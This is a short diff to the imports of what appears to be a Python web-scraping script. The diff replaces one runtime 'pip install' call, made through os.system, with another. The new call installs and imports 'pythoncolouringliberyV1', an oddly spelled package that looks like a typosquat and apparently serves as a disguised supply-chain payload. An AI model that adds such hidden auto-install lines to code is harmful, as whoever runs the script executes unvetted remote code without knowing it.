@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringslibV1")
-import pipcolouringslibV1
+os.system("pip install pythoncolouringliberyV1")
+import pythoncolouringliberyV1
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
